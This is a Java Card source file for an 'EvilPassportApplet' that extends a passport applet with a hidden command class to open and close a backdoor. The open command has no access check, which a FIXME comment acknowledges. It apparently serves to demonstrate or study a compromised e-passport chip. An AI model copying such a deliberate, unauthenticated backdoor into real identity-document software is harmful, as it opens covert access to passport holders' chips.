/**
 * 
 */
package sos.passportapplet;

import javacard.framework.APDU;

/**
 * @author ronny
 *
 */
public class EvilPassportApplet extends PassportApplet {
	private boolean backdoorIsOpen = false;

	static final short RESPONSE_NOT_HANDLED = -1;
	
    EvilPassportApplet (byte mode) {
    	super (mode);
    }
    
    /**
     * Installs an instance of the applet.
     * 
     * @param buffer
     * @param offset
     * @param length
     * @see javacard.framework.Applet#install(byte[], byte, byte)
     */
    public static void install(byte[] buffer, short offset, byte length) {
        (new EvilPassportApplet(PassportCrypto.JCOP41_MODE)).register();
    }
    
	public short processAPDU(APDU apdu, byte cla, byte ins, boolean protectedApdu, short le) {
		short responseLength = RESPONSE_NOT_HANDLED;
		
		if (cla == EvilInterface.CLA_EVIL)
			responseLength = processEvil (apdu, ins, le);

		if (responseLength == RESPONSE_NOT_HANDLED)
			responseLength = super.processAPDU (apdu, cla, ins, protectedApdu, le);
		
		return responseLength;
	}
	
	public short processEvil(APDU apdu, byte ins, short le) {
		short responseLength = RESPONSE_NOT_HANDLED;
		byte[] buffer = apdu.getBuffer();

		if (!backdoorIsOpen
				&& ins == EvilInterface.INS_OPEN_BACKDOOR
				//&& le == 2
				//&& buffer[OFFSET_P1] == 0 && buffer[OFFSET_P2] == 0
				/* FIXME: check access code */)
			backdoorIsOpen = true;

		if (backdoorIsOpen)
		{
			switch (ins)
			{
			case EvilInterface.INS_OPEN_BACKDOOR:
				buffer[0] = EvilInterface.INTERFACE_VERSION_NUMBER >>> 8;
				buffer[1] = EvilInterface.INTERFACE_VERSION_NUMBER & 0xFF;
				responseLength = 2;
				break;
			case EvilInterface.INS_CLOSE_BACKDOOR:
				backdoorIsOpen = false;
				responseLength = 0;
				break;
			default:
			}
		}
		
		return responseLength;
	}
}
